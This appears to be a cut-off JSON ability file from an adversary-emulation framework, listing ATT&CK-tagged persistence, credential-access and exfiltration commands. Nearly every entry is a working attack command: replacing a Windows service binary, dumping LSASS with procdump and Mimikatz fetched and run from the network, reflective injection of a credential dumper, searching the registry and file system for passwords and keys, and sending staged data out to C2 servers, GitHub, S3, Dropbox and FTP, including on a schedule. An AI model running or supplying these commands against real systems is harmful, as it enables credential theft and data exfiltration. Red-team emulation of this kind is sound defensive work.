{
    "52771610-2322-44cf-816b-a7df42b4c086": {
        "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n",
                    "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "52771610-2322-44cf-816b-a7df42b4c086",
            "host.service.modifiable",
            "None"
        ],
        "plugin": "stockpile"
    },
    "3c647015-ab0a-496a-8847-6ab173cd2b22": {
        "description": "Custom GO credential dumper using minidumpwritedump",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n",
                    "payloads": [
                        "totallylegit.exe"
                    ],
                    "cleanup": "if (Test-Path \"C:\\Users\\Public\\creds.dmp\") {\n  rm \"C:\\Users\\Public\\creds.dmp\" -Force;\n};\n"
                }
            }
        },
        "id__dependence__fact": [
            "3c647015-ab0a-496a-8847-6ab173cd2b22",
            "host.process.id",
            "None"
        ],
        "plugin": "stockpile"
    },
    "3aad5312-d48b-4206-9de4-39866c12e60f": {
        "description": "Search for possible credentials stored in Registry",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "reg query HKCU /f password /t REG_SZ /s\n"
                }
            }
        },
        "id__dependence__fact": [
            "3aad5312-d48b-4206-9de4-39866c12e60f",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "0ef4cc7b-611c-4237-b20b-db36b6906554": {
        "description": "Dump lsass for later use with mimikatz",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"
                }
            }
        },
        "id__dependence__fact": [
            "0ef4cc7b-611c-4237-b20b-db36b6906554",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "de632c2d-a729-4b77-b781-6a6b09c148ba": {
        "description": "Find private keys on the file system",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"
                },
                "cmd": {
                    "command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"
                }
            }
        },
        "id__dependence__fact": [
            "de632c2d-a729-4b77-b781-6a6b09c148ba",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7": {
        "description": "Injects cred dumper exe into an available process",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"
                }
            }
        },
        "id__dependence__fact": [
            "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "98e58fc4-3843-4511-89b1-50cb872e0c9b": {
        "description": "Search for possible credentials stored in the HKLM Hive",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "reg query HKLM /f password /t REG_SZ /s\n"
                }
            }
        },
        "id__dependence__fact": [
            "98e58fc4-3843-4511-89b1-50cb872e0c9b",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "baac2c6d-4652-4b7e-ab0a-f1bf246edd12": {
        "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.katz": [
                            {
                                "source": "domain.user.name",
                                "edge": "has_password",
                                "target": "domain.user.password"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
            "None",
            "domain.user.name"
        ],
        "plugin": "stockpile"
    },
    "a201bec2-a193-4b58-bf0e-57fa621da474": {
        "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};\n"
                }
            }
        },
        "id__dependence__fact": [
            "a201bec2-a193-4b58-bf0e-57fa621da474",
            "host.dir.staged",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c": {
        "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.002",
            "name": "Exfiltration to Cloud Storage"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n",
                    "cleanup": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n",
                    "cleanup": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n"
                }
            }
        },
        "id__dependence__fact": [
            "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "4a1120a5-971c-457f-bb07-60641b4723fd": {
        "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "4a1120a5-971c-457f-bb07-60641b4723fd",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "2f90d4de-2612-4468-9251-b220e3727452": {
        "description": "This ability will compress a given git repository.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;\n",
                    "cleanup": "rm #{host.dir.git}.tar.gz;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;\n",
                    "cleanup": "Remove-Item -Path #{host.dir.git}.tar.gz;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "2f90d4de-2612-4468-9251-b220e3727452",
            "None",
            "host.dir.compress"
        ],
        "plugin": "stockpile"
    },
    "0582dc26-e0cf-4645-88cf-f37a02279976": {
        "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;\n"
                }
            }
        },
        "id__dependence__fact": [
            "0582dc26-e0cf-4645-88cf-f37a02279976",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "110cea7a-5b03-4443-92ee-7ccefaead451": {
        "description": "This ability exfiltrates the staged directory at a scheduled time.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1029",
            "name": "Scheduled Transfer"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;\n",
                    "cleanup": "rm /tmp/mycron;\ncrontab /tmp/origcron;\nrm /tmp/origcron;\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$commandString = '$fieldName = \\\"#{host.dir.compress}\";\n$filePath = \\\"#{host.dir.compress}\";\n$url = \\\"#{server}/file/upload\\\";\nAdd-Type -AssemblyName \\\"System.Net.Http\\\";\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n\n$xRequestIdHeader = \\\"X-Request-Id\\\";\n$xRequestIdField = $env:COMPUTERNAME + \\\"-#{paw}\\\";\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);\n\n$userAgentHeader = \\\"User-Agent\\\";\n$userAgentField = \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\";\n$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);\n$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"$commandString\";\n$trigger = New-ScheduledTaskTrigger -Once -At 12pm;\n\nRegister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Trigger $trigger -Action $action;\n",
                    "cleanup": "Unregister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Confirm:$false;"
                }
            }
        },
        "id__dependence__fact": [
            "110cea7a-5b03-4443-92ee-7ccefaead451",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "ea713bc4-63f0-491c-9a6f-0b01d560b87e": {
        "description": "Exfil the staged directory",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1041",
            "name": "Exfiltration Over C2 Channel"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"
                }
            }
        },
        "id__dependence__fact": [
            "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "5c5b0392-1daa-45e1-967c-2f361ce78849": {
        "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1030",
            "name": "Data Transfer Size Limits"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;\n",
                    "cleanup": "find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' -exec rm -rf {} \\;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" '-p#{host.archive.password}' | Out-Null;\nsleep 2;\n$Archive = Get-Item -Path \"#{host.dir.staged}.7z\";\n$StageDir = \"#{host.dir.staged}\";\n$BaseName = $StageDir + \"\\calderachunk\";\n$UpperBound = [int32]\"#{file.size.chunk}\";\n$Content = [IO.File]::OpenRead($Archive);\n$buff = New-Object byte[] $UpperBound;\n$Bytes = $idx = 0;\ntry {\n    do {\n        $Bytes = $Content.Read($buff, 0, $buff.Length);\n        if ($Bytes -gt 0) {\n            $ChunkName = \"{0}{1}\" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));\n            $ChunkFile = [IO.File]::OpenWrite($ChunkName);\n            try {\n                $ChunkFile.Write($buff, 0, $Bytes);\n            } finally {\n                $ChunkFile.Close();\n            }\n        }\n        $idx ++;\n    } while ($Bytes -gt 0)\n}\nfinally {\n    $Content.Close();\n}\nRemove-Item $Archive;\nGet-ChildItem -Path \"$StageDir\\calderachunk*\" | foreach {$_.FullName} | Select-Object;\n",
                    "cleanup": "Get-ChildItem -Path \"$StageDir\\calderachunk*\" | Remove-Item;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "5c5b0392-1daa-45e1-967c-2f361ce78849",
            "host.dir.staged",
            "host.dir.compress"
        ],
        "plugin": "stockpile"
    },
    "300157e5-f4ad-4569-b533-9d1fa0e74d74": {
        "description": "Compress a directory on the file system",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n",
                    "cleanup": "rm #{host.dir.staged}.zip\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "300157e5-f4ad-4569-b533-9d1fa0e74d74",
            "host.dir.staged",
            "host.dir.compress"
        ],
        "plugin": "stockpile"
    },
    "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081": {
        "description": "This will exfiltrate an archive to Dropbox.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.002",
            "name": "Exfiltration to Cloud Storage"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}\n"
                }
            }
        },
        "id__dependence__fact": [
            "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "ba0deadb-97ac-4a4c-aa81-21912fc90980": {
        "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1537",
            "name": "Transfer Data to Cloud Account"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n"
                }
            }
        },
        "id__dependence__fact": [
            "ba0deadb-97ac-4a4c-aa81-21912fc90980",
            "host.dir.compress",
            "None"
        ],
        "plugin": "stockpile"
    },
    "d754878c-17dd-46dc-891c-a993f8a10336": {
        "description": "This ability exfiltrates a compressed archive to an FTP server.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'\n"
